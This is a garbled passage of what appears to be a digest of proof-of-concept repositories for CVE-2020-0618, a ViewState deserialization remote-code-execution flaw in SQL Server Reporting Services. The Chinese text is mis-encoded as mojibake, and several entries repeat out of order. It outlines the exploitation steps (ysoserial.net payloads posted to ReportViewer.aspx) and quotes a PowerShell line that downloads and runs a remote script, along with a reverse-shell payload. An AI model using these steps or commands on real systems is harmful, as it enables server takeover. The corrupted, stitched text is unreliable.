4.  æ”»å‡»è€…æ„é€ åŒ…å«è¯¥payloadçš„æ¶æ„è¯·æ±‚ï¼Œå‘é€åˆ°SSRSæœåŠ¡å™¨çš„webé¡µé¢ã€‚æ¼æ´åˆ©ç”¨é“¾å¤§è‡´å¦‚ä¸‹ï¼šç½‘é¡µè¯·æ±‚->ViewState->LosFormatterååºåˆ—åŒ–->TypeConfuseDelegate -> Powershell RCE
5.  SSRSæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚æ—¶ï¼Œä¼šååºåˆ—åŒ–`ViewState`ï¼Œç”±äº`LosFormatter`çš„ä¸å®‰å…¨æ€§ï¼Œä¼šå¯¼è‡´ä»£ç æ‰§è¡Œã€‚`TypeConfuseDelegate` gadgetä¼šå°†ååºåˆ—åŒ–è¿‡ç¨‹å¯¼å‘æ¶æ„ä»£ç ã€‚
6.  æœ€ç»ˆï¼ŒæœåŠ¡å™¨ä¼šæ‰§è¡Œpayloadä¸­åµŒå…¥çš„powershellå‘½ä»¤ï¼Œæ”»å‡»è€…ä»è€Œè·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œçš„èƒ½åŠ›ã€‚

**é¡¹ç›®åœ°å€:** [itstarsec/CVE-2020-0618](https://github.com/itstarsec/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #4

**æ¥æº**: [CVE-2020-0618-wortell_cve-2020-0618.md](../2020/CVE-2020-0618-wortell_cve-2020-0618.md)

## CVE-2020-0618 Microsoft SQL Server Reporting Services RCE Honeypot

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬ä½†ä¸é™äºï¼šMicrosoft SQL Server 2012, 2014, 2016

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®å­˜åœ¨æ¼æ´çš„SSRSæœåŠ¡ï¼Œé€šå¸¸æ˜¯WebæœåŠ¡ç«¯å£

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªMicrosoft SQL Server Reporting Services (SSRS) ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ŒæºäºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚ã€‚è¯¥æ¼æ´æ˜¯ç”±äº.NET ViewStateååºåˆ—åŒ–æ—¶æœªè¿›è¡Œå……åˆ†çš„è¾“å…¥éªŒè¯å¯¼è‡´çš„ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´æ˜¯çœŸå®å­˜åœ¨çš„ï¼Œå¹¶ä¸”æœ‰å…¬å¼€çš„PoCï¼ˆProof of Conceptï¼‰ä»£ç å¯ç”¨ã€‚æä¾›çš„ä»£ç æ˜¯ä¸€ä¸ªèœœç½ï¼Œæ—¨åœ¨æ£€æµ‹åˆ©ç”¨CVE-2020-0618çš„æ”»å‡»å°è¯•ï¼Œè€Œä¸æ˜¯ç›´æ¥åˆ©ç”¨è¯¥æ¼æ´ã€‚èœœç½é€šè¿‡æ¨¡æ‹ŸSSRSæœåŠ¡ï¼Œè®°å½•æ‰€æœ‰è¯·æ±‚ï¼Œç‰¹åˆ«æ˜¯é‚£äº›è¯•å›¾è§¦å‘æ¼æ´çš„è¯·æ±‚ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼é€šå¸¸æ¶‰åŠæ„é€ æ¶æ„çš„.NET ViewStateï¼Œå°†å…¶ä½œä¸ºè¯·æ±‚çš„ä¸€éƒ¨åˆ†å‘é€åˆ°SSRSæœåŠ¡å™¨ã€‚æœåŠ¡å™¨åœ¨ååºåˆ—åŒ–ViewStateæ—¶ï¼Œä¼šæ‰§è¡Œæ”»å‡»è€…é¢„å…ˆè®¾å®šçš„æ¶æ„ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚æ”»å‡»è€…å¯èƒ½éœ€è¦å…ˆæ‰¾åˆ°æœ‰æ•ˆçš„ViewStateï¼Œç„¶åæ›¿æ¢å…¶ä¸­çš„éƒ¨åˆ†å†…å®¹ï¼Œæˆ–è€…ç”Ÿæˆå…¨æ–°çš„æ¶æ„ViewStateã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
è¯¥ä»£ç åº“ä¸»è¦æ˜¯ä¸€ä¸ªèœœç½ï¼Œå…¶ç›®çš„æ˜¯**æ£€æµ‹**è€Œé**åˆ©ç”¨**æ¼æ´ã€‚ ä»£ç åŒ…å«ç”¨äºæ¨¡æ‹ŸSSRSæœåŠ¡å™¨è¡Œä¸ºçš„éƒ¨åˆ†ï¼Œä»¥åŠç”¨äºè®°å½•è¯·æ±‚å’Œé”™è¯¯çš„æ—¥å¿—è®°å½•åŠŸèƒ½ã€‚ ä½†æ˜¯,ä»ç„¶å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£é™©ï¼Œä¾‹å¦‚ï¼š

*   **è™šå‡æ—¥å¿—ï¼š** æ”»å‡»è€…å¯ä»¥ä¿®æ”¹æ—¥å¿—è®°å½•éƒ¨åˆ†ï¼Œä½¿å…¶æŠ¥å‘Šè™šå‡ä¿¡æ¯ï¼Œè¯¯å¯¼å®‰å…¨åˆ†æäººå‘˜ã€‚
*   **èµ„æºæ¶ˆè€—ï¼š** æ”»å‡»è€…å¯èƒ½ä¿®æ”¹ä»£ç ï¼Œä½¿å…¶åœ¨æ¥æ”¶åˆ°ç‰¹å®šç±»å‹çš„è¯·æ±‚æ—¶æ¶ˆè€—å¤§é‡èµ„æºï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚

è€ƒè™‘åˆ°ä»£ç åº“çš„èœœç½æ€§è´¨å’Œç°æœ‰åŠŸèƒ½ï¼Œåˆ¤å®šæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä½†ä¸èƒ½å®Œå…¨æ’é™¤ã€‚ é£é™©è¯„ä¼°åœ¨5%ã€‚

**é¡¹ç›®åœ°å€:** [wortell/cve-2020-0618](https://github.com/wortell/cve-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---



---

## POC #2

**æ¥æº**: [CVE-2020-0618-euphrat1ca_CVE-2020-0618.md](../2020/CVE-2020-0618-euphrat1ca_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services Remote Code Execution

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æ§åˆ¶å—å½±å“çš„æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4 (QFE), SQL Server 2016 SP2 (CU), SQL Server 2014 SP3 (GDR/CU)

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿå‘ReportServer/pages/ReportViewer.aspxå‘é€POSTè¯·æ±‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618 æ˜¯ Microsoft SQL Server Reporting Services (SSRS) ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æºäº SSRS åœ¨å¤„ç†é¡µé¢è¯·æ±‚æ—¶å­˜åœ¨ä¸æ­£ç¡®çš„ååºåˆ—åŒ–æ“ä½œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ `ViewState` å‚æ•°ï¼Œå°†å…¶æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚ä¸­ï¼Œåˆ©ç”¨ `LosFormatter` ååºåˆ—åŒ–å™¨æ‰§è¡Œä»»æ„ä»£ç ã€‚æä¾›çš„ PoC ä½¿ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload ä½¿ç”¨ `TypeConfuseDelegate` gadget chainï¼Œå¹¶é€šè¿‡ PowerShell æ‰§è¡Œåå‘è¿æ¥ shell å‘½ä»¤ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  ä½¿ç”¨ `ysoserial.net` å·¥å…·ç”Ÿæˆæ¶æ„çš„ `ViewState` Payloadã€‚
2.  å°† Payload æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚çš„ `NavigationCorrector$ViewState` å‚æ•°ä¸­ã€‚
3.  å‘é€ç²¾å¿ƒæ„é€ çš„ POST è¯·æ±‚åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚
4.  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œ Payload ä¸­åŒ…å«çš„æ¶æ„ä»£ç ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è¯¥ PoC ä»£ç ä¸»è¦åˆ©ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload è¾ƒä¸ºå¸¸è§ï¼Œä¸»è¦é£é™©å­˜åœ¨äºæ‰§è¡Œçš„ Powershell è„šæœ¬ã€‚è„šæœ¬å†…å®¹æœ¬èº«æ˜¯ä¸ºäº†å»ºç«‹åå‘ shellï¼Œä½†è‹¥æ”»å‡»è€…ä¿®æ”¹è„šæœ¬ä¸­çš„ IP åœ°å€æˆ–ç«¯å£ï¼Œå¯èƒ½å¯¼è‡´å—å®³è€…è¿æ¥åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼Œä»è€Œæ³„éœ²ä¿¡æ¯æˆ–è¢«è¿›ä¸€æ­¥æ§åˆ¶ã€‚ä»“åº“æœ¬èº«ä¹Ÿå¯èƒ½è¢«å…¶ä»–äººç¯¡æ”¹ã€‚ç»¼åˆè€ƒè™‘ï¼ŒæŠ•æ¯’é£é™©çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [euphrat1ca/CVE-2020-0618](https://github.com/euphrat1ca/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #3

**æ¥æº**: [CVE-2020-0618-itstarsec_CVE-2020-0618.md](../2020/CVE-2020-0618-itstarsec_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services RCE

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4, 2014 SP3, 2016 SP2 ç­‰ï¼Œå…·ä½“å‚è€ƒæ¼æ´åº“ä¿¡æ¯

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®SSRSæœåŠ¡çš„webé¡µé¢

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªå­˜åœ¨äºMicrosoft SQL Server Reporting Servicesä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æ˜¯ç”±äºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚å¯¼è‡´çš„ï¼Œæ›´å…·ä½“åœ°è¯´ï¼Œæ˜¯ç”±äº`ViewState`ååºåˆ—åŒ–æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ç‰¹åˆ¶çš„é¡µé¢è¯·æ±‚ï¼Œåˆ©ç”¨ä¸å®‰å…¨çš„`LosFormatter`ååºåˆ—åŒ–è¿‡ç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒä½¿ç”¨äº†`ysoserial.net`å·¥å…·ç”Ÿæˆæ¶æ„çš„åºåˆ—åŒ–payloadï¼Œå¹¶ä½¿ç”¨`TypeConfuseDelegate` gadgetï¼Œè¯¥gadgetå¸¸ç”¨äº.NETååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ã€‚Payloadä¸­åµŒå…¥äº†powershellå‘½ä»¤ï¼Œç”¨äºæ‰§è¡Œä»»æ„ä»£ç ï¼Œä¾‹å¦‚é€šè¿‡`iwr`ä¸‹è½½å¹¶æ‰§è¡Œè¿œç¨‹è„šæœ¬ã€‚

**æŠ•æ¯’é£é™©ï¼š**
è¯¥ä»“åº“å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦çš„æ¼æ´åˆ©ç”¨ä»£ç çœ‹èµ·æ¥æ˜¯åˆç†çš„ï¼Œä½†ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š
*   POCä»£ç ä¸­çš„`iwr("https://qoigyuef2a4z1a7rsir6lvi3eukl8a.burpcollaborator.net/In")|iex'`ï¼Œè¯¥URLæŒ‡å‘ä¸€ä¸ªå¤–éƒ¨èµ„æºï¼Œå¦‚æœè¯¥èµ„æºè¢«ç¯¡æ”¹ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç ã€‚
*   è™½ç„¶åˆ©ç”¨ä»£ç çœ‹èµ·æ¥åƒæ˜¯åˆæ³•çš„åˆ©ç”¨ï¼Œä½†ä»ç„¶è¦è°¨æ…ï¼Œç”±äº `burpcollaborator.net` åŸŸåæ˜¯ä¸€ç§å¸¸ç”¨çš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œè™½ç„¶åœ¨æœ¬æ¬¡ä¸Šä¸‹æ–‡ä¸­ä¸ä¸€å®šæ˜¯æ¶æ„çš„ï¼Œä½†ä¹Ÿå¢åŠ äº†æŠ•æ¯’çš„æ¦‚ç‡.
ç»¼åˆè€ƒè™‘ï¼Œè¯„ä¼°æŠ•æ¯’é£é™©ä¸º10%ã€‚ä¸»è¦é£é™©åœ¨äºå¤–éƒ¨URLå’Œæ½œåœ¨çš„payloadã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦ç¡®å®šç›®æ ‡SSRSæœåŠ¡å™¨å­˜åœ¨CVE-2020-0618æ¼æ´ã€‚
2.  ä½¿ç”¨`ysoserial.net`å·¥å…·ï¼ŒåŸºäº`TypeConfuseDelegate` gadgetå’Œ`LosFormatter`æ ¼å¼ï¼Œç”ŸæˆåŒ…å«æ¶æ„powershellå‘½ä»¤çš„åºåˆ—åŒ–payloadã€‚
3.  æ¶æ„powershellå‘½ä»¤ä¼šè¢«ç¼–ç æˆBase64å­—ç¬¦ä¸²ã€‚
4.  æ”»å‡»è€…æ„é€ åŒ…å«è¯¥payloadçš„æ¶æ„è¯·æ±‚ï¼Œå‘é€åˆ°SSRSæœåŠ¡å™¨çš„webé¡µé¢ã€‚æ¼æ´åˆ©ç”¨é“¾å¤§è‡´å¦‚ä¸‹ï¼šç½‘é¡µè¯·æ±‚->ViewState->LosFormatterååºåˆ—åŒ–->TypeConfuseDelegate -> Powershell RCE
5.  SSRSæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚æ—¶ï¼Œä¼šååºåˆ—åŒ–`ViewState`ï¼Œç”±äº`LosFormatter`çš„ä¸å®‰å…¨æ€§ï¼Œä¼šå¯¼è‡´ä»£ç æ‰§è¡Œã€‚`TypeConfuseDelegate` gadgetä¼šå°†ååºåˆ—åŒ–è¿‡ç¨‹å¯¼å‘æ¶æ„ä»£ç ã€‚
6.  æœ€ç»ˆï¼ŒæœåŠ¡å™¨ä¼šæ‰§è¡Œpayloadä¸­åµŒå…¥çš„powershellå‘½ä»¤ï¼Œæ”»å‡»è€…ä»è€Œè·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œçš„èƒ½åŠ›ã€‚

**é¡¹ç›®åœ°å€:** [itstarsec/CVE-2020-0618](https://github.com/itstarsec/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #4

**æ¥æº**: [CVE-2020-0618-wortell_cve-2020-0618.md](../2020/CVE-2020-0618-wortell_cve-2020-0618.md)

## CVE-2020-0618 Microsoft SQL Server Reporting Services RCE Honeypot

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬ä½†ä¸é™äºï¼šMicrosoft SQL Server 2012, 2014, 2016

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®å­˜åœ¨æ¼æ´çš„SSRSæœåŠ¡ï¼Œé€šå¸¸æ˜¯WebæœåŠ¡ç«¯å£

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªMicrosoft SQL Server Reporting Services (SSRS) ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ŒæºäºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚ã€‚è¯¥æ¼æ´æ˜¯ç”±äº.NET ViewStateååºåˆ—åŒ–æ—¶æœªè¿›è¡Œå……åˆ†çš„è¾“å…¥éªŒè¯å¯¼è‡´çš„ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´æ˜¯çœŸå®å­˜åœ¨çš„ï¼Œå¹¶ä¸”æœ‰å…¬å¼€çš„PoCï¼ˆProof of Conceptï¼‰ä»£ç å¯ç”¨ã€‚æä¾›çš„ä»£ç æ˜¯ä¸€ä¸ªèœœç½ï¼Œæ—¨åœ¨æ£€æµ‹åˆ©ç”¨CVE-2020-0618çš„æ”»å‡»å°è¯•ï¼Œè€Œä¸æ˜¯ç›´æ¥åˆ©ç”¨è¯¥æ¼æ´ã€‚èœœç½é€šè¿‡æ¨¡æ‹ŸSSRSæœåŠ¡ï¼Œè®°å½•æ‰€æœ‰è¯·æ±‚ï¼Œç‰¹åˆ«æ˜¯é‚£äº›è¯•å›¾è§¦å‘æ¼æ´çš„è¯·æ±‚ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼é€šå¸¸æ¶‰åŠæ„é€ æ¶æ„çš„.NET ViewStateï¼Œå°†å…¶ä½œä¸ºè¯·æ±‚çš„ä¸€éƒ¨åˆ†å‘é€åˆ°SSRSæœåŠ¡å™¨ã€‚æœåŠ¡å™¨åœ¨ååºåˆ—åŒ–ViewStateæ—¶ï¼Œä¼šæ‰§è¡Œæ”»å‡»è€…é¢„å…ˆè®¾å®šçš„æ¶æ„ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚æ”»å‡»è€…å¯èƒ½éœ€è¦å…ˆæ‰¾åˆ°æœ‰æ•ˆçš„ViewStateï¼Œç„¶åæ›¿æ¢å…¶ä¸­çš„éƒ¨åˆ†å†…å®¹ï¼Œæˆ–è€…ç”Ÿæˆå…¨æ–°çš„æ¶æ„ViewStateã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
è¯¥ä»£ç åº“ä¸»è¦æ˜¯ä¸€ä¸ªèœœç½ï¼Œå…¶ç›®çš„æ˜¯**æ£€æµ‹**è€Œé**åˆ©ç”¨**æ¼æ´ã€‚ ä»£ç åŒ…å«ç”¨äºæ¨¡æ‹ŸSSRSæœåŠ¡å™¨è¡Œä¸ºçš„éƒ¨åˆ†ï¼Œä»¥åŠç”¨äºè®°å½•è¯·æ±‚å’Œé”™è¯¯çš„æ—¥å¿—è®°å½•åŠŸèƒ½ã€‚ ä½†æ˜¯,ä»ç„¶å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£é™©ï¼Œä¾‹å¦‚ï¼š

*   **è™šå‡æ—¥å¿—ï¼š** æ”»å‡»è€…å¯ä»¥ä¿®æ”¹æ—¥å¿—è®°å½•éƒ¨åˆ†ï¼Œä½¿å…¶æŠ¥å‘Šè™šå‡ä¿¡æ¯ï¼Œè¯¯å¯¼å®‰å…¨åˆ†æäººå‘˜ã€‚
*   **èµ„æºæ¶ˆè€—ï¼š** æ”»å‡»è€…å¯èƒ½ä¿®æ”¹ä»£ç ï¼Œä½¿å…¶åœ¨æ¥æ”¶åˆ°ç‰¹å®šç±»å‹çš„è¯·æ±‚æ—¶æ¶ˆè€—å¤§é‡èµ„æºï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚

è€ƒè™‘åˆ°ä»£ç åº“çš„èœœç½æ€§è´¨å’Œç°æœ‰åŠŸèƒ½ï¼Œåˆ¤å®šæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä½†ä¸èƒ½å®Œå…¨æ’é™¤ã€‚ é£é™©è¯„ä¼°åœ¨5%ã€‚

**é¡¹ç›®åœ°å€:** [wortell/cve-2020-0618](https://github.com/wortell/cve-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---



---

## POC #2

**æ¥æº**: [CVE-2020-0618-euphrat1ca_CVE-2020-0618.md](../2020/CVE-2020-0618-euphrat1ca_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services Remote Code Execution

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æ§åˆ¶å—å½±å“çš„æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4 (QFE), SQL Server 2016 SP2 (CU), SQL Server 2014 SP3 (GDR/CU)

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿå‘ReportServer/pages/ReportViewer.aspxå‘é€POSTè¯·æ±‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618 æ˜¯ Microsoft SQL Server Reporting Services (SSRS) ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æºäº SSRS åœ¨å¤„ç†é¡µé¢è¯·æ±‚æ—¶å­˜åœ¨ä¸æ­£ç¡®çš„ååºåˆ—åŒ–æ“ä½œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ `ViewState` å‚æ•°ï¼Œå°†å…¶æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚ä¸­ï¼Œåˆ©ç”¨ `LosFormatter` ååºåˆ—åŒ–å™¨æ‰§è¡Œä»»æ„ä»£ç ã€‚æä¾›çš„ PoC ä½¿ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload ä½¿ç”¨ `TypeConfuseDelegate` gadget chainï¼Œå¹¶é€šè¿‡ PowerShell æ‰§è¡Œåå‘è¿æ¥ shell å‘½ä»¤ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  ä½¿ç”¨ `ysoserial.net` å·¥å…·ç”Ÿæˆæ¶æ„çš„ `ViewState` Payloadã€‚
2.  å°† Payload æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚çš„ `NavigationCorrector$ViewState` å‚æ•°ä¸­ã€‚
3.  å‘é€ç²¾å¿ƒæ„é€ çš„ POST è¯·æ±‚åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚
4.  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œ Payload ä¸­åŒ…å«çš„æ¶æ„ä»£ç ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è¯¥ PoC ä»£ç ä¸»è¦åˆ©ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload è¾ƒä¸ºå¸¸è§ï¼Œä¸»è¦é£é™©å­˜åœ¨äºæ‰§è¡Œçš„ Powershell è„šæœ¬ã€‚è„šæœ¬å†…å®¹æœ¬èº«æ˜¯ä¸ºäº†å»ºç«‹åå‘ shellï¼Œä½†è‹¥æ”»å‡»è€…ä¿®æ”¹è„šæœ¬ä¸­çš„ IP åœ°å€æˆ–ç«¯å£ï¼Œå¯èƒ½å¯¼è‡´å—å®³è€…è¿æ¥åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼Œä»è€Œæ³„éœ²ä¿¡æ¯æˆ–è¢«è¿›ä¸€æ­¥æ§åˆ¶ã€‚ä»“åº“æœ¬èº«ä¹Ÿå¯èƒ½è¢«å…¶ä»–äººç¯¡æ”¹ã€‚ç»¼åˆè€ƒè™‘ï¼ŒæŠ•æ¯’é£é™©çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [euphrat1ca/CVE-2020-0618](https://github.com/euphrat1ca/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #3

**æ¥æº**: [CVE-2020-0618-itstarsec_CVE-2020-0618.md](../2020/CVE-2020-0618-itstarsec_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services RCE

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4, 2014 SP3, 2016 SP2 ç­‰ï¼Œå…·ä½“å‚è€ƒæ¼æ´åº“ä¿¡æ¯

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®SSRSæœåŠ¡çš„webé¡µé¢

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªå­˜åœ¨äºMicrosoft SQL Server Reporting Servicesä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æ˜¯ç”±äºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚å¯¼è‡´çš„ï¼Œæ›´å…·ä½“åœ°è¯´ï¼Œæ˜¯ç”±äº`ViewState`ååºåˆ—åŒ–æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ç‰¹åˆ¶çš„é¡µé¢è¯·æ±‚ï¼Œåˆ©ç”¨ä¸å®‰å…¨çš„`LosFormatter`ååºåˆ—åŒ–è¿‡ç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
